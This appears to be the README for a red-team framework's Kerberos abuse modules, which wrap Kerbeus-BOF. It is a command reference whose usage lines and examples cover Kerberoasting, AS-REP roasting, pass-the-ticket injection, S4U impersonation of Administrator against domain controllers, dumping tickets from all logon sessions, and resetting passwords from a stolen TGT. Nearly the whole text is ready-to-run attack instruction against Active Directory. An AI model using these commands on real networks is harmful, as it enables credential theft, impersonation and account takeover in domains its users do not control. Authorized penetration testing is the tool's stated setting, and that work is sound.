# Kerberos Abuse Modules <!-- omit from toc -->

## Contents <!-- omit from toc -->

- [Overview](#overview)
  - [asktgt](#asktgt)
  - [asktgs](#asktgs)
  - [renew](#renew)
  - [s4u](#s4u)
  - [cross-s4u](#cross-s4u)
  - [ptt](#ptt)
  - [purge](#purge)
  - [describe](#describe)
  - [klist](#klist)
  - [dump](#dump)
  - [triage](#triage)
  - [tgtdeleg](#tgtdeleg)
  - [kerbeus-kerberoast](#kerbeus-kerberoast)
  - [kerbeus-asreproast](#kerbeus-asreproast)
  - [hash](#hash)
  - [changepw](#changepw)

## Overview

The Kerberos abuse modules provide commands for interacting with and abusing the Kerberos authentication protocol. All commands are implemented as BOF wrappers for [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF). Arguments are passed directly to the underlying BOF using Kerberos-style `/flag:<value>` syntax. The module contains the following commands:

```
 * asktgt                   Retrieve a TGT for a user using username and password/hash.
 * asktgs                   Retrieve a service ticket using a TGT.
 * renew                    Renew a TGT.
 * s4u                      Perform S4U constrained delegation abuse.
 * cross-s4u                Perform S4U constrained delegation abuse across domains.
 * ptt                      Inject a Kerberos ticket into a logon session via Pass-the-Ticket.
 * purge                    Purge tickets from a logon session.
 * describe                 Parse and describe a ticket.
 * klist                    List tickets in the current logon session.
 * dump                     Extract TGTs and service tickets.
 * triage                   List current user tickets.
 * tgtdeleg                 Retrieve a usable TGT without elevation via Kerberos GSS-API abuse.
 * kerbeus-kerberoast       Perform Kerberoasting.
 * kerbeus-asreproast       Perform AS-REP roasting.
 * hash                     Calculate rc4_hmac, aes128 and aes256 hashes from a password.
 * changepw                 Reset a user's password from a supplied TGT.
```

### asktgt
Retrieve a TGT for a user using a password or hash.

```
Usage  : asktgt /user:<USER> {/password:<PASSWORD> | /aes256:<HASH> | /rc4:<HASH> | /nopreauth} [flags]
Example: asktgt /user:john /password:Password123! /domain:conquest.local /ptt

Required flags:
  /user:<USER>              STRING     Target username.

Authentication (one required):
  /password:<PASSWORD>      STRING     Plaintext password.
  /aes256:<HASH>            STRING     AES256 hash.
  /rc4:<HASH>               STRING     RC4/NTLM hash.
  /nopreauth                BOOL       Request without pre-authentication.

Optional flags:
  /domain:<DOMAIN>          STRING     Target domain.
  /dc:<DC>                  STRING     Domain controller to contact.
  /enctype:{rc4|aes256}     STRING     Encryption type.
  /ptt                      BOOL       Inject ticket into current logon session.
  /nopac                    BOOL       Request a ticket without a PAC.
  /opsec                    BOOL       Use OPSEC-safe techniques.
```

### asktgs
Retrieve a service ticket (TGS) using an existing TGT.

```
Usage  : asktgs /ticket:<BASE64> /service:<SPN> [flags]
Example: asktgs /ticket:<BASE64> /service:cifs/dc01.conquest.local /ptt

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /service:<SPN>            STRING     Service SPN(s) to request tickets for, comma-separated.

Optional flags:
  /domain:<DOMAIN>          STRING     Domain to request ticket from.
  /dc:<DC>                  STRING     Domain controller to contact.
  /tgs:<BASE64>             STRING     Base64-encoded TGS for S4U2Proxy.
  /targetdomain:<DOMAIN>    STRING     Target domain for cross-domain requests.
  /targetuser:<USER>        STRING     Target user for S4U2Self/S4U2Proxy.
  /enctype:{rc4|aes256}     STRING     Encryption type (default: aes256).
  /ptt                      BOOL       Inject ticket into current logon session.
  /keylist                  BOOL       List encryption keys.
  /u2u                      BOOL       Request a User-to-User ticket (use with /tgs).
  /opsec                    BOOL       Use OPSEC-safe techniques.
```

### renew
Renew a TGT.

```
Usage  : renew /ticket:<BASE64> [flags]
Example: renew /ticket:<BASE64> /ptt

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.

Optional flags:
  /dc:<DC>                  STRING     Domain controller to contact.
  /ptt                      BOOL       Inject renewed ticket into current logon session.
```

### s4u
Perform S4U constrained delegation abuse to impersonate a user against a target service.

```
Usage  : s4u /ticket:<BASE64> /service:<SPN> {/impersonateuser:<USER> | /tgs:<BASE64>} [flags]
Example: s4u /ticket:<BASE64> /service:cifs/dc01.conquest.local /impersonateuser:Administrator /ptt

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /service:<SPN>            STRING     Target service SPN.
  /impersonateuser:<USER>   STRING     User to impersonate (required if /tgs not provided).
  /tgs:<BASE64>             STRING     Base64-encoded TGS (required if /impersonateuser not provided).

Optional flags:
  /domain:<DOMAIN>          STRING     Domain.
  /dc:<DC>                  STRING     Domain controller.
  /altservice:<SERVICE>     STRING     Alternative service to substitute in the ticket.
  /ptt                      BOOL       Inject ticket into current logon session.
  /nopac                    BOOL       Request ticket without a PAC.
  /opsec                    BOOL       Use OPSEC-safe techniques.
  /self                     BOOL       Perform S4U2Self only.
```

### cross-s4u
Perform S4U constrained delegation abuse across domain boundaries.

```
Usage  : cross-s4u /ticket:<BASE64> /service:<SPN> /targetdomain:<DOMAIN> /targetdc:<DC> {/impersonateuser:<USER> | /tgs:<BASE64>} [flags]
Example: cross-s4u /ticket:<BASE64> /service:cifs/dc02.external.local /targetdomain:external.local /targetdc:dc02.external.local /impersonateuser:Administrator

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /service:<SPN>            STRING     Target service SPN.
  /targetdomain:<DOMAIN>    STRING     Target domain.
  /targetdc:<DC>            STRING     Target domain controller.
  /impersonateuser:<USER>   STRING     User to impersonate.
  /tgs:<BASE64>             STRING     Base64-encoded TGS.

Optional flags:
  /domain:<DOMAIN>          STRING     Source domain.
  /dc:<DC>                  STRING     Source domain controller.
  /altservice:<SERVICE>     STRING     Alternative service to substitute in the ticket.
  /nopac                    BOOL       Request ticket without a PAC.
  /self                     BOOL       Perform S4U2Self only.
```

### ptt
Inject a Kerberos ticket into a logon session via Pass-the-Ticket.

```
Usage  : ptt /ticket:<BASE64> [flags]
Example: ptt /ticket:<BASE64>

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded ticket to inject.

Optional flags:
  /luid:<LOGONID>           STRING     Logon session ID to inject into (default: current session).
```

### purge
Purge Kerberos tickets from a logon session.

```
Usage  : purge [flags]
Example: purge /luid:0x4b5e3f2

Optional flags:
  /luid:<LOGONID>           STRING     Logon session ID to purge (default: current session).
```

### describe
Parse and display the contents of a Kerberos ticket.

```
Usage  : describe /ticket:<BASE64>
Example: describe /ticket:<BASE64>

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded ticket to describe.
```

### klist
List tickets in the current user's logon session. In an elevated context, displays tickets from all logon sessions on the system.

```
Usage  : klist [flags]
Example: klist /user:john

Optional flags:
  /luid:<LOGINID>           STRING     Filter by logon session ID.
  /user:<USER>              STRING     Filter by username.
  /service:<SERVICE>        STRING     Filter by service.
  /client:<CLIENT>          STRING     Filter by client.
```

### dump
Extract TGTs and service tickets for the current user. In an elevated context, extracts tickets from all logon sessions on the system.

```
Usage  : dump [flags]
Example: dump /user:john /service:krbtgt

Optional flags:
  /luid:<LOGINID>           STRING     Filter by logon session ID.
  /user:<USER>              STRING     Filter by username.
  /service:<SERVICE>        STRING     Filter by service.
  /client:<CLIENT>          STRING     Filter by client.
```

### triage
Display a summary table of Kerberos tickets for the current user. In an elevated context, displays tickets from all logon sessions on the system.

```
Usage  : triage [flags]
Example: triage

Optional flags:
  /luid:<LOGINID>           STRING     Filter by logon session ID.
  /user:<USER>              STRING     Filter by username.
  /service:<SERVICE>        STRING     Filter by service.
  /client:<CLIENT>          STRING     Filter by client.
```

### tgtdeleg
Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API `AcquireCredentialsHandle` / `InitializeSecurityContext` flow.

```
Usage  : tgtdeleg [flags]
Example: tgtdeleg /target:cifs/dc01.conquest.local

Optional flags:
  /target:<SPN>             STRING     Target SPN to request delegation for.
```

### kerbeus-kerberoast
Perform Kerberoasting by requesting service tickets for accounts with SPNs and outputting them in a crackable format.

```
Usage  : kerbeus-kerberoast /spn:<SPN> [flags]
Example: kerbeus-kerberoast /spn:MSSQLSvc/sql01.conquest.local:1433

Required flags:
  /spn:<SPN>                STRING     Target service principal name.

Optional flags:
  /nopreauth:<USER>         STRING     User without pre-authentication to perform the roast as.
  /dc:<DC>                  STRING     Domain controller to contact.
  /domain:<DOMAIN>          STRING     Domain.
  /ticket:<BASE64>          STRING     Base64-encoded TGT to use for the request.
```

### kerbeus-asreproast
Perform AS-REP roasting against accounts that do not require Kerberos pre-authentication.

```
Usage  : kerbeus-asreproast /user:<USER> [flags]
Example: kerbeus-asreproast /user:john /domain:conquest.local

Required flags:
  /user:<USER>              STRING     Target username.

Optional flags:
  /dc:<DC>                  STRING     Domain controller to contact.
  /domain:<DOMAIN>          STRING     Domain.
```

### hash
Calculate Kerberos-compatible hashes from a plaintext password.

```
Usage  : hash /password:<PASSWORD> [flags]
Example: hash /password:Password123! /user:john /domain:conquest.local

Required flags:
  /password:<PASSWORD>      STRING     Password to hash.

Optional flags:
  /user:<USER>              STRING     Username (used as salt for AES hash calculation).
  /domain:<DOMAIN>          STRING     Domain (used as salt for AES hash calculation).
```

Outputs `rc4_hmac`, `aes128_cts_hmac_sha1`, and `aes256_cts_hmac_sha1` hashes.

### changepw
Reset a user's password using a supplied TGT via the Kerberos set-password protocol (kpasswd).

```
Usage  : changepw /ticket:<BASE64> /new:<PASSWORD> [flags]
Example: changepw /ticket:<BASE64> /new:NewPassword123! /targetuser:john

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /new:<PASSWORD>           STRING     New password to set.

Optional flags:
  /dc:<DC>                  STRING     Domain controller to contact.
  /targetuser:<USER>        STRING     Target user (default: user in the TGT).
  /targetdomain:<DOMAIN>    STRING     Target domain.
```